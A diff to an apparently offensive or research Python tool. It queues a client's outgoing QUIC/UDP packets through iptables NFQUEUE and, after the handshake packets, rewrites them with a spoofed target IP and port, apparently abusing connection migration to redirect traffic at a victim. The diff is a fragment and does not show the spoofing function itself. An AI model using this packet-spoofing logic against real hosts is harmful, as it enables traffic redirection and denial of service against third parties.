@@ -45,6 +45,7 @@ banner = '''
 '''
 
 SPOOFED_COUNT = 0
+PACKET_COUNT = 0
 
 # Iptables Templates
 iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
@@ -127,14 +128,24 @@ def spoof_packet(packet, ip, port=0):
 
 def connection_migration_callback(packet, starttime=0, args=None):
     global SPOOFED_COUNT
+    global PACKET_COUNT
+    
+    PACKET_COUNT += 1
+
     if args.limit != 0 and SPOOFED_COUNT >= args.limit:
         packet.drop()
         return
 
-    if time.time()-starttime > args.start_time:
+    # Ugly workaround to give enough packets to succeed with handshake
+    if PACKET_COUNT > 3:
         packet = spoof_packet(packet, args.target_ip, args.target_port)
         if args.limit != 0:
             SPOOFED_COUNT += 1
+
+    #if time.time()-starttime > args.start_time:
+    #    packet = spoof_packet(packet, args.target_ip, args.target_port)
+    #    if args.limit != 0:
+    #        SPOOFED_COUNT += 1
 
     packet.accept()
     
@@ -196,10 +207,10 @@ def configure_client(args):
 
 def configure_legacy_client(args):
     cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
-    #if args.version and args.version != '1':
-    #    cmd += lsquic_client_flag_version.format(version=args.version)     
-    #if args.alpn and args.alpn != '':
-    #    cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
+    if args.version and args.version != '1':
+        cmd += lsquic_client_flag_version.format(version=args.version)     
+    if args.alpn and args.alpn != 'h3':
+        cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
     
     print(cmd)
     return cmd
